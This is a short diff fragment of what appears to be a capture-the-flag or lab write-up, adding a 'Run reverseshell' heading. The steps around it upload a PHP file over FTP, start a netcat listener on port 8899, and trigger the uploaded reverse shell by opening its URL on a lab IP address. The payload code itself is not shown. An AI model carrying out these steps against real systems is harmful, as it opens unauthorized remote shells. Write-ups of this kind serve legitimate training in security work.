@@ -15,6 +15,8 @@ put getin.php
 
 bye
 
+## Run reverseshell:
+
 - attacker先run： nc -nlvp 8899
 - run the reverse shell by running the web browser: 10.10.207.136/webalizer/getin.php
 
